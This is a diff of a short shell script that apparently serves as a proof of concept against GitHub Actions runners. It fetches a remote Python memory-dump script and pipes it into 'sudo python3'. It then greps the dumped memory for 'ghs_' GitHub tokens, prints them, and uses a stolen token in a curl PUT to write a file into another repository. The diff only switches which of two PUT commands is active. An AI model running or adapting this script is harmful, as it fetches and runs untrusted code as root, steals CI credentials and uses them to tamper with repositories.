@@ -5,7 +5,6 @@ readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 #FILE="r3s34rch.md"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
 
-
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
@@ -14,20 +13,20 @@ echo "$T2"
 echo "---------------------------3--------------------------------------"
 
 
-curl -L \
-  -X PUT \
-  -H "Accept: application/vnd.github+json" \
-  -H "Authorization: token $T2" \
-  -H "X-GitHub-Api-Version: 2022-11-28" \
-  "https://api.github.com/repos/${REPO}/contents/README1.md" \
-  -d '{"message":"hello from r3s34rch","content":"bXkgbmV3IGZpbGUgY29udGVudHM="}'
+#curl -L \
+#  -X PUT \
+#  -H "Accept: application/vnd.github+json" \
+#  -H "Authorization: token $T2" \
+#  -H "X-GitHub-Api-Version: 2022-11-28" \
+#  "https://api.github.com/repos/${REPO}/contents/README1.md" \
+#  -d '{"message":"hello from r3s34rch","content":"bXkgbmV3IGZpbGUgY29udGVudHM="}'
   
-#curl \
-#    -X PUT \
-#    -H "Accept: application/vnd.github.v3+json" \
-#    -H "Authorization: Token $TOKEN_VAL" \
-#    "https://api.github.com/repos/${REPO}/contents/README1.md" \
-#    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
+curl \
+    -X PUT \
+    -H "Accept: application/vnd.github.v3+json" \
+    -H "Authorization: Token $T2" \
+    "https://api.github.com/repos/${REPO}/contents/README1.md" \
+    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
 
 #curl "https://api.github.com/repos/${REPO}/contents/README.md"      
 
